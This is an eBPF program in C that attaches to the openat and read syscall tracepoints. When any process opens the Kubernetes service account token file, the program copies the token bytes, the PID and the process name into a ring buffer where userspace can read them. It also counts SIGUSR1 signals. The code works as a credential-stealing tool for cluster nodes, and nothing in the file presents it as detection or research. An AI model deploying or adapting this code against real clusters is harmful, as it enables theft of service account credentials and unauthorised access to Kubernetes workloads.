/* SPDX-License-Identifier: GPL-2.0 */
#include "vmlinux.h"
//#include <linux/bpf.h>
//#include <linux/pkt_cls.h>
//#include <signal.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#include <bpf/bpf_helpers.h>

struct datarec {
	__u64 calls;
} datarec;

struct event {
	u32 pid;
	u8 comm[80];
    u8 token[4096];
};

// Force emitting struct event into the ELF.
const struct event *unused __attribute__((unused));

struct {
	__uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
	__type(key, __u32);
	__type(value, datarec);
	__uint(max_entries, 8);
} tracepoint_stats_map SEC(".maps");

struct kill_args {
  long long pad;
  long syscall_nr;
  long pid;
  long sig;
};

#define SIGUSR1		10	/* User-defined signal 1.  */

SEC("tracepoint/tracepoint_kill_recorder")
static __u32 tracepoint_kill_recorder(struct kill_args *ctx)
{
    if (ctx->sig != SIGUSR1)
        return 0;

    __u32 index = 0;
    struct datarec *rec = bpf_map_lookup_elem(&tracepoint_stats_map, &index);
    if (!rec)
        return 1;

    rec->calls++;
    //bpf_printk("process received SIGUSR1");

    return 0;
}

// Map to hold the File Descriptors from 'openat' calls
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u64);
    __type(value, unsigned int);
} map_fds SEC(".maps");

// Map to fold the buffer sized from 'read' calls
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u64);
    __type(value, long unsigned int);
} map_buff_addrs SEC(".maps");

struct {
	__uint(type, BPF_MAP_TYPE_RINGBUF);
	__uint(max_entries, 1 << 24);
} tokens SEC(".maps");

enum { local_buff_size = 64 };

// We only care about attempts to open an SA token
const volatile char filename[] = "/var/run/secrets/kubernetes.io/serviceaccount/token";

SEC("tp/syscalls/sys_enter_openat")
static __u32 enter_openat(struct trace_event_raw_sys_enter *ctx)
{

    // Get filename from arguments
    char check_filename[local_buff_size];
    int filename_len = bpf_probe_read_user_str(&check_filename, local_buff_size, (char*)ctx->args[1]);
    if (filename_len <= 0) {
        return 0;
    }

    // Check filename is our target
    for (int i = 0; i < filename_len; i++) {
        if (filename[i] != check_filename[i]) {
            return 0;
        }
    }

    __u64 pid_tgid = bpf_get_current_pid_tgid();

    // Add pid_tgid to map for our sys_exit call
    unsigned int zero = 0;
    bpf_map_update_elem(&map_fds, &pid_tgid, &zero, BPF_ANY);

    bpf_printk("tid %d Filename %s\n",pid_tgid, filename);

    return 0;
}

SEC("tp/syscalls/sys_exit_openat")
int exit_openat(struct trace_event_raw_sys_exit *ctx)
{
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    unsigned int* check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (check == 0) {
        return 0;
    }
    
    // Set the map value to be the returned file descriptor
    unsigned int fd = (unsigned int)ctx->ret;
    bpf_map_update_elem(&map_fds, &pid_tgid, &fd, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_enter_read")
static __u32 enter_read(struct trace_event_raw_sys_enter *ctx)
{
    // Get pid_tgid from arguments
    __u64 pid_tgid = bpf_get_current_pid_tgid();

    // Check if pid_tgid is in map
    unsigned int* fd = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (!fd) {
        return 0;
    }

     // Check this is the correct file descriptor
    unsigned int map_fd = *fd;
    unsigned int dfd = (unsigned int) ctx->args[0];
    if (map_fd != dfd) {
        bpf_printk("map_fd :%d dfd: %d\n",map_fd, dfd);
        return 0;
    }

    // Add buffer address to map for our sys_exit call
    unsigned long buff_addr = ctx->args[1];
    bpf_printk("tid %d Adding buffer %d on read\n",pid_tgid, buff_addr);

    bpf_map_update_elem(&map_buff_addrs, &pid_tgid, &buff_addr, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_exit_read")
static __u32 exit_read(struct trace_event_raw_sys_exit *ctx){
    // Get pid_tgid from arguments
    __u64 pid_tgid = bpf_get_current_pid_tgid();

    // Check if pid_tgid is in map
    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    if (!pbuff_addr) {
        return 0;
    }

    long unsigned int buff_addr = *pbuff_addr;

    // Get buffer size from arguments
    unsigned int buff_size = ctx->ret;
    // If we're greater than buf size just truncate
    if (buff_size > 4096) {
        buff_size = 4096;
    }

    // nothing to read
    if (buff_size == 0) { 
        // Closing file, delete fd from all maps to clean up
        bpf_map_delete_elem(&map_fds, &pid_tgid);
        bpf_map_delete_elem(&map_buff_addrs, &pid_tgid);

        return 0;
    }

    __u32 pid = pid_tgid >> 32;
    struct event *token_entry;

    token_entry = bpf_ringbuf_reserve(&tokens, sizeof(struct event), 0);
	if (!token_entry) {
		return 0;
	}

    token_entry->pid = pid;
    bpf_get_current_comm(&token_entry->comm, 80);

    int ret = bpf_probe_read_user(&token_entry->token, buff_size, (void*)buff_addr);
    if (ret != 0) {
        bpf_printk("Error reading buffer: %d\n", ret);
    }

    bpf_ringbuf_submit(token_entry, 0);


    return 0;
}


char _license[] SEC("license") = "GPL";
